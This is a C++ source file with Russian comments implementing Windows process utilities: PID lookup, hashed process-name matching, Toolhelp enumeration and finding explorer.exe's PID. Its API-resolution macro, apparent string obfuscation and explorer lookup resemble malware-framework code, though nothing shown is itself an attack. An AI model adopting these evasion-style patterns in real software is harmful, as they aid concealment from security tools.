#include "core\process.h"
#include "core\debug.h"
#include "core\file.h"
#include "core\util.h"
#include "core\hook.h"
#include <Wtsapi32.h>
//такое нужно чтобы взялась функция GetModuleFileNameExA совместимая с XP
#define PSAPI_VERSION 1
#include "psapi.h"

namespace Process
{

DWORD CurrentPID()
{
	return API(KERNEL32, GetCurrentProcessId)();
}

uint CurrentHash()
{
	StringBuilderStack<64> name;
	Name(name);
	name.Lower();
	return name.Hash();
}

StringBuilder& Name( StringBuilder& name )
{
	StringBuilderStack<MAX_PATH> path;
	Path::GetStartupExe(path);
	name = Path::GetFileName(path);
	return name;
}

StringBuilder& Name( DWORD pid, StringBuilder& name, bool full )
{
	HANDLE  hProc;
	hProc = API(KERNEL32, OpenProcess)( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid );
	if( hProc )
	{
		char path[MAX_PATH];
		int ret = API(PSAPI, GetModuleFileNameExA)( hProc, 0, path, MAX_PATH ); //эта функция может находится в Kernel, см. доки
		API(KERNEL32, CloseHandle)(hProc);
		if( ret > 0 )
			if( full )
				name = path;
			else
				name = Path::GetFileName(path);
		else
			name.SetEmpty();
	}
	return name;
}

struct struGetPID
{
	StringBuilderStack<64> nameProcess;
	uint hash;
	DWORD pid;
	bool full;
};

static bool GetPIDCallback( ProcessInfo& pi, void* tag )
{
	struGetPID* sgp = (struGetPID*)tag;
	if( pi.hash == sgp->hash && ((sgp->full && pi.fullPath == sgp->nameProcess) || (!sgp->full && pi.fileName == sgp->nameProcess)) )
	{
		sgp->pid = pi.pid;
		return true;
	}
	return false;
}

DWORD GetPID( const char* nameProcess, bool full )
{
	struGetPID sgp;
	sgp.nameProcess = nameProcess;
	sgp.nameProcess.Lower();
	if( full )
		sgp.hash = Str::Hash( Path::GetFileName(sgp.nameProcess.c_str()) );
	else
		sgp.hash = sgp.nameProcess.Hash();
	sgp.pid = 0;
	sgp.full = full;
	ListProcess( &GetPIDCallback, &sgp );
	return sgp.pid;
}

DWORD GetPID( HWND hwnd )
{
	DWORD pid = 0;
	API(USER32, GetWindowThreadProcessId)( hwnd, &pid );
	return pid;
}

DWORD GetPID( HANDLE hthread )
{
	THREAD_BASIC_INFORMATION info;
	DWORD size;

	if( API(NTDLL, ZwQueryInformationThread)( hthread, ThreadBasicInformation, &info, sizeof(info), &size ) == STATUS_SUCCESS )
		return (DWORD)info.ClientId.UniqueProcess;

	return 0;
}

int ListProcess( typeListProcessCallback func, void* tag, DWORD typeSnap )
{
	HANDLE snap = API(KERNEL32, CreateToolhelp32Snapshot)( typeSnap, 0 );
	PROCESSENTRY32 pe;
	pe.dwSize = sizeof(pe);
	API(KERNEL32, Process32First)( snap, &pe );
	ProcessInfo* pi = new ProcessInfo();
	int ret = 0;
	do
	{
		Str::Lower(pe.szExeFile);
		pi->fileName = pe.szExeFile;
		Name( pe.th32ProcessID,  pi->fullPath, true );
		pi->fullPath.Lower();
		pi->hash = pi->fileName.Hash();
		pi->pid = pe.th32ProcessID;
		pi->parentPid = pe.th32ParentProcessID;
		ret++;
		if( func( *pi, tag ) ) break;
	} while( API(KERNEL32, Process32Next)( snap, &pe ) );
	API(KERNEL32, CloseHandle)(snap);
	delete pi;
	return ret;
}

DWORD GetExplorerPID()
{
    DWORD pid = 0;
	//ищем проводник по его классу окна
	HWND wnd = API(USER32, FindWindowA)( _CS_("Shell_TrayWnd"), 0 );
	if( wnd )
	{
		API(USER32, GetWindowThreadProcessId)( wnd, &pid );
	}
	//по классу окна не удалось определить, ищем по имени процесса
	if( pid == 0 )
	{
		pid = GetPID( _CS_("explorer.exe") );
	}
	return pid;
}

bool IsAlive( HANDLE hprocess )
{
	DWORD exitCode = 0;
	API(KERNEL32, GetExitCodeProcess)( hprocess, &exitCode ); 
    return exitCode == STILL_ACTIVE;
}

}
